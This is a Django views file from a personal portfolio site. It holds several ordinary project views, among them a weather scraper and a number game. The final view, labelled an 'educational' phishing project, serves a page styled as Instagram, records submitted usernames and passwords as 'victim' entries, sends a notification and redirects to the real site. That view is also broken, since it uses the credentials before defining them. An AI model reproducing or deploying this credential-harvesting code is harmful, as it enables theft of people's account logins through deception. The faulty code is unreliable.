import random
from datetime import datetime

import pytz
import requests
from base.views import log, push
from bs4 import BeautifulSoup
from django.contrib.auth.decorators import login_required
from django.shortcuts import redirect, render
from .models import Phishing

# Create your views here.


def projects(request):
    log(request, 'Projects')
    projects = [
        {'name': 'Weather App', 'info': 'A project to get weather from all places (WEB)',
            'src': '/projects/weather', 'btn': 'Go'},
        {'name': 'PyFlit', 'info': 'Tool for adding components and pages in flask',
            'src': 'https://pypi.org/project/pyflit/', 'btn': 'Pypi'},
        {'name': 'Abettor', 'info': 'Chat app made with python with lot of functions (CLI)',
            'src': 'https://github.com/Jerit-Baiju/Abettor', 'btn': 'GitHub'},
        {'name': 'Clara', 'info': 'A Chatbot named Clara. (WEB)',
            'src': '/projects/clara', 'btn': 'Chat'},
        {'name': 'MySite', 'info': 'Django web app (WebSite)',
            'src': 'https://github.com/Jerit-Baiju/MySite-Django', 'btn': 'GitHub'},
        {'name': 'Sadance', 'info': 'Attendance register (WEB)',
            'src': '/projects/sadance', 'btn': 'See'},
        {'name': 'Num Game', 'info': 'A number guessing game',
            'src': '/projects/num_game', 'btn': 'Play'},
        {'name': 'Phishing', 'info':'NOTE : This project is only for educational purpose and not meant for harming anyone.','src':'/projects/phishing','btn':'Test'}
    ]
    random.shuffle(projects)
    context = {
        'title': 'Projects | Jerit Baiju',
        'projects': projects,
        'page': 'projects'
    }
    return render(request, 'projects/projects.html', context)


@login_required(login_url='login-page')
def clara(request):
    log(request, 'Clara')
    context = {
        'title': 'Clara | Jerit Baiju',
        'name': request.user.first_name,
        'date': str(datetime.now(pytz.timezone("Asia/Kolkata")).date()),
        'time': datetime.now(pytz.timezone("Asia/Kolkata")).strftime("%H:%M")
    }
    return render(request, 'projects/clara.html', context)


@login_required(login_url='login-page')
def sadance(request):
    log(request, 'Sadance')
    return render(request, 'projects/sadance.html', {'title': 'Sadance | Jerit Baiju'})


@login_required(login_url='login-page')
def num_Game(request):
    if request.user.score == None:
        score = 0
    else:
        score = request.user.score

    if request.method == 'POST':
        context = {
            'score': score,
            'win': True,
            'dark': True,
            'title': 'Number Game'
        }
        return render(request, 'projects/num_game.html', context)
    else:
        log(request, 'Num Game')
        context = {
            'score': score,
            'title': 'Number Game',
            'randint': random.randint(0, 100),
            'dark': True
        }
        return render(request, 'projects/num_game.html', context)


@login_required(login_url='login-page')
def num_Game_add(request):
    if request.user.score == None:
        score = 0
    else:
        score = request.user.score
    request.user.score = score + 5
    request.user.save()
    log(request, 'scored')
    return redirect('/projects/num_game')


@login_required(login_url='login-page')
def weather(request):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36"
    }
    context = {
        'title': 'Weather App',
        'dark': True
    }
    if request.method == 'POST':
        def get_weather(city):
            try:
                url = f"https://www.google.com/search?q=weather+in+{city}"
                page = requests.get(url, headers=headers)
                soup = BeautifulSoup(page.content, 'html.parser')
                temperature = soup.find('span', attrs={'id': 'wob_ttm'}).text
                status = soup.find('span', attrs={'id': 'wob_dc'}).text
                location = soup.find('div', attrs={'id': 'wob_loc'}).text
                temperature_op = (f"{temperature} °F \n")
                status_op = (f"Status - {status} \n")
                src = soup.find('img', attrs={'id': 'wob_tci'}).get('src')
                day = soup.find('div', attrs={'id': 'wob_dts'}).text
                context = {'tmp': temperature_op, 'loc': location,
                           'sts': status_op, 'day': day, 'src': src, 'dark': True}
            except:
                context = {'tmp': '', 'loc': 'No Location Found, Try entering your nearest place or city',
                           'sts': '', 'day': '', 'src': '', 'title': 'Weather App', 'dark': True}
            return context
        city = request.POST['city']
        log(request, f'weather - {city}')
        return render(request, 'projects/weather.html', get_weather(city))
    log(request, 'weather')
    return render(request, 'projects/weather.html', context)

def phishing(request):
    victim,update = Phishing.objects.update_or_create(username,password)
    if request.method == 'POST':
        username = request.POST.get('username').lower()
        password = request.POST.get('password')
        victim.save()
        push(f'phishing -- {request.user} -- submitted')
        return redirect('instagram')
    return render(request, 'projects/instagram.html')